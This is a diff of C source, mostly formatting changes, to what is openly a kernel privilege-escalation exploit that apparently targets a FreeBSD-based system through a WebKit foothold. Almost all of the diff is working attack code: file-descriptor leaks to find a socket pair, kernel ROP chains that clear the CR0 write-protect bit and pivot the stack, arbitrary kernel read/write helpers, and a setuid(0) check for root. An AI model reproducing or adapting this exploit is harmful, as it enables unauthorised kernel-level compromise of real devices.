-        for(size_t i = 0; i < kexec_helper_end - kexec_helper_bin; i++)
+void kexec_helper(void *src, void *dst, void *gs0) {
+    if (!kexec_helper_rwx) {
+        kexec_helper_rwx = mmap(0, kexec_helper_end - kexec_helper_bin, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
+        for (size_t i = 0; i < kexec_helper_end - kexec_helper_bin; i++)
             kexec_helper_rwx[i] = kexec_helper_bin[i];
     }
-    void* args[3] = {src, dst, gs0};
+    void *args[3] = { src, dst, gs0 };
     rop_call_funcptr(kexec_helper_rwx, 0, &args);
 }
 
-uintptr_t kexec_get_td(void)
-{
+uintptr_t kexec_get_td(void) {
     uint64_t x;
     kexec_helper(&x, &x, &x);
     return x;
 }
 
-uintptr_t kexec_read64(uintptr_t ptr)
-{
+uintptr_t kexec_read64(uintptr_t ptr) {
     uint64_t ans, td;
-    kexec_helper((void*)ptr, &ans, &td);
+    kexec_helper((void *)ptr, &ans, &td);
     return ans;
 }
 
-void kexec_write64(uintptr_t ptr, uintptr_t val)
-{
+void kexec_write64(uintptr_t ptr, uintptr_t val) {
     uint64_t td;
-    kexec_helper(&val, (void*)ptr, &td);
+    kexec_helper(&val, (void *)ptr, &td);
 }
 
-void fix_fds(int* kp_bad_fds, int nfds)
-{
+void fix_fds(int *kp_bad_fds, int nfds) {
     uint64_t td = kexec_get_td();
-    uint64_t fd = kexec_read64(kexec_read64(kexec_read64(td+8)+72));
-    for(int i = 0; i < nfds; i++)
-    {
-        uint64_t sock = kexec_read64(kexec_read64(fd+8*kp_bad_fds[i]));
-        for(int base = 74; base <= 136; base += 62) // socket->so_{rcv,snd}
+    uint64_t fd = kexec_read64(kexec_read64(kexec_read64(td + 8) + 72));
+    for (int i = 0; i < nfds; i++) {
+        uint64_t sock = kexec_read64(kexec_read64(fd + 8 * kp_bad_fds[i]));
+        for (int base = 74; base <= 136; base += 62) // socket->so_{rcv,snd}
         {
-            kexec_write64(sock+4*base, 0); //sb_mb
-            kexec_write64(sock+4*(base+8), (uint32_t)kexec_read64(sock+4*(base+8))); //sb_cc
-            kexec_write64(sock+4*(base+10), (uint32_t)kexec_read64(sock+4*(base+10))); //sb_mbcnf
+            kexec_write64(sock + 4 * base, 0); //sb_mb
+            kexec_write64(sock + 4 * (base + 8), (uint32_t)kexec_read64(sock + 4 * (base + 8))); //sb_cc
+            kexec_write64(sock + 4 * (base + 10), (uint32_t)kexec_read64(sock + 4 * (base + 10))); //sb_mbcnf
         }
         //fd[kp_bad_fds[i]] = 0;
     }
 }
 
-int exploit()
-{
+int exploit() {
     int suberr;
     int kp_sel_fd;
     nanosleep("\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
@@ -715,36 +664,33 @@ int exploit()
     char buf[16];
     size_t sz = sizeof(buf);
     randomized_path(0, buf, &sz);
-    for(int i = 0; i < 10; i++)
-        path[i+1] = buf[i];
-    for(int i = 0; i < 256; i++)
-        fd[255-i] = open(path, O_RDONLY);
-    for(int i = FD_LEAK_SIZE; i < 256; i++)
+    for (int i = 0; i < 10; i++)
+        path[i + 1] = buf[i];
+    for (int i = 0; i < 256; i++)
+        fd[255 - i] = open(path, O_RDONLY);
+    for (int i = FD_LEAK_SIZE; i < 256; i++)
         close(fd[i]);
     uintptr_t leak[FD_LEAK_SIZE];
-    if((suberr = leak_fds(fd, leak, FD_LEAK_SIZE)))
-    {
+    if ((suberr = leak_fds(fd, leak, FD_LEAK_SIZE))) {
         printf("leak_fds failed\n");
         return suberr;
     }
-    for(int i = 0; i < FD_LEAK_SIZE; i++)
-        printf("%d %d %p\n", i, fd[i], (void*)leak[i]);
+    for (int i = 0; i < FD_LEAK_SIZE; i++)
+        printf("%d %d %p\n", i, fd[i], (void *)leak[i]);
     int low = -1, high = -1;
-    for(int i = 0; i < FD_LEAK_SIZE && low < 0; i++)
-        if((leak[i] & 255) == 0x20)
-            for(int j = 0; j < FD_LEAK_SIZE && low < 0; j++)
-                if(leak[j] != leak[i] && (leak[j] & ~255ull) == (leak[i] & ~255ull))
-                {
+    for (int i = 0; i < FD_LEAK_SIZE && low < 0; i++)
+        if ((leak[i] & 255) == 0x20)
+            for (int j = 0; j < FD_LEAK_SIZE && low < 0; j++)
+                if (leak[j] != leak[i] && (leak[j] & ~255ull) == (leak[i] & ~255ull)) {
                     low = i;
                     high = j;
                 }
-    for(int i = 0; i < FD_LEAK_SIZE; i++)
-        if(i != low && i != high)
+    for (int i = 0; i < FD_LEAK_SIZE; i++)
+        if (i != low && i != high)
             close(fd[i]);
-    if(low < 0)
-    {
+    if (low < 0) {
         printf("no good socket pair found, aborting\n");
-        for(int i = 0; i < 256; i++)
+        for (int i = 0; i < 256; i++)
             close(fd[i]);
         return 1;
     }
@@ -752,7 +698,7 @@ int exploit()
     printf("%llx\n", (long long)lseek(fd[low], __builtin_gadget_addr("dq 0x2eadbeefdeadbeef"), SEEK_SET));
     printf("%d\n", errno);
     int dups[8];
-    for(int i = 0; i < 8; i++)
+    for (int i = 0; i < 8; i++)
         printf("%d\n", dups[i] = my_dup(fd[low]));
     /* krop stuff */
     unsigned short idt_size;
@@ -767,9 +713,9 @@ int exploit()
     unsigned long long ud_dump[2];
     unsigned long long ud_handler = __builtin_gadget_addr("$pivot_addr");
     unsigned int magic = 0xdeadbeef;
-    void** dead = (void*)(1+(uintptr_t)mmap((void*)__builtin_gadget_addr("dq 0x900000000"), 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0));
+    void **dead = (void *)(1 + (uintptr_t)mmap((void *)__builtin_gadget_addr("dq 0x900000000"), 16384, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));
     printf("%p %d\n", dead, errno);
-    save_area_t* sa = mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    save_area_t *sa = mmap(0, 16384, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     (*sa)[0] = 1; //prefault
     unsigned long long pivot2;
     unsigned long long krop1[] = {
@@ -804,7 +750,7 @@ int exploit()
         __builtin_gadget_addr("mov [rdi], eax"),
         //reset cr0.WP
         kernel_base + KERNEL_READ_CR0,
-	__builtin_gadget_addr("pop rcx"),
+    __builtin_gadget_addr("pop rcx"),
         __builtin_gadget_addr("dq 0xfffffffffffeffff"),
         __builtin_gadget_addr("and rax, rcx"),
         //prepare #UD stack pivot
@@ -824,7 +770,7 @@ int exploit()
         __builtin_gadget_addr("mov rax, [rcx]"),
         __builtin_gadget_addr("mov [rdi], ax"),
         __builtin_gadget_addr("pop rdi"),
-        ud_base+6,
+        ud_base + 6,
         __builtin_gadget_addr("pop rcx"),
         &ud_2_bak,
         __builtin_gadget_addr("mov rax, [rcx]"),
@@ -845,7 +791,7 @@ int exploit()
         __builtin_gadget_addr("mov rax, [rax]"),
         __builtin_gadget_addr("mov rax, [rax]"),
         __builtin_gadget_addr("pop rdi"),
-        krop2+32,
+        krop2 + 32,
         __builtin_gadget_addr("mov [rdi], rax"),
         //call fixup.rop
         __builtin_gadget_addr("pop rdi"),
@@ -856,7 +802,7 @@ int exploit()
         kernel_fixup,
         //store return value
         __builtin_gadget_addr("pop rdi"),
-        ud_dump+1,
+        ud_dump + 1,
         __builtin_gadget_addr("mov [rdi], rax"),
         //restore elf header
         __builtin_gadget_addr("pop rdi"),
@@ -944,20 +890,18 @@ int exploit()
     pivot2 = krop2;
     kp_kernel_base = kernel_base;
     kp_decref_fp = leak[high];
-    kernel_fixup_ret = krop2+35;
-    unsigned long long rax[14] = {0, 0, __builtin_gadget_addr("$pivot_addr") /* mov rsp, [rdi + 0x38] ; pop rdi ; ret */, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, __builtin_gadget_addr("$webkit_base + 0xd3890") /* push rbp ; mov rbp, rsp ; mov rax, [rdi] ; call [rax + 0x10] */};
-    unsigned long long rdi[8] = {rax, 0, 0, 0, 0, 0, 0, krop1};
+    kernel_fixup_ret = krop2 + 35;
+    unsigned long long rax[14] = { 0, 0, __builtin_gadget_addr("$pivot_addr") /* mov rsp, [rdi + 0x38] ; pop rdi ; ret */, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, __builtin_gadget_addr("$webkit_base + 0xd3890") /* push rbp ; mov rbp, rsp ; mov rax, [rdi] ; call [rax + 0x10] */ };
+    unsigned long long rdi[8] = { rax, 0, 0, 0, 0, 0, 0, krop1 };
     dead[1] = rdi;
     dead[4] = __builtin_gadget_addr("$webkit_base + 0x1480be2"); //mov rdi, [rax + 8] ; mov rax, [rdi] ; jmp [rax + 0x68]
     /* end krop stuff */
-    if((suberr = wrap_trigger(fd[high], leak[low] + 0x1b, &kp_sel_fd)))
-    {
+    if ((suberr = wrap_trigger(fd[high], leak[low] + 0x1b, &kp_sel_fd))) {
         printf("trigger failed\n");
         printf("%d\n", setuid(0));
         return suberr;
     }
-    if(magic == 0xdeadbeef)
-    {
+    if (magic == 0xdeadbeef) {
         printf("exploit reports success but krop did not run, wtf??\n");
         return 2;
     }
@@ -966,34 +910,31 @@ int exploit()
     return 0;
 }
 
-void transfer_data()
-{
-    int sock[2] = {-1, -1};
+void transfer_data() {
+    int sock[2] = { -1, -1 };
     socketpair(AF_UNIX, SOCK_DGRAM, 0, sock);
     char buf[128];
-    for(int i = 0; i < 128; i++)
+    for (int i = 0; i < 128; i++)
         buf[i] = i;
-    for(int i = 0; i < 512; i++)
-    {
-        for(int j = 0; j < 8; j++)
+    for (int i = 0; i < 512; i++) {
+        for (int j = 0; j < 8; j++)
             sendto(sock[0], buf, 128, 0, 0, 0);
-        for(int j = 0; j < 8; j++)
+        for (int j = 0; j < 8; j++)
             recvfrom(sock[1], buf, 128, 0, 0, 0);
     }
-    for(int i = 0; i < 5; i++)
+    for (int i = 0; i < 5; i++)
         sendto(sock[0], buf, 128, 0, 0, 0);
 }
 
-int main()
-{
-    if(!setuid(0)) //already exploited
+int main() {
+    if (!setuid(0)) //already exploited
         return 179;
     transfer_data();
-    kp_bad_fds = kp_bad_fds_end = mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    kp_bad_fds = kp_bad_fds_end = mmap(0, 16384, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     int ans;
-    while((ans = exploit()) == 1);
-    if(ans)
+    while ((ans = exploit()) == 1);
+    if (ans)
         return ans;
-    fix_fds(kp_bad_fds, kp_bad_fds_end-kp_bad_fds);
+    fix_fds(kp_bad_fds, kp_bad_fds_end - kp_bad_fds);
     return 0;
 }
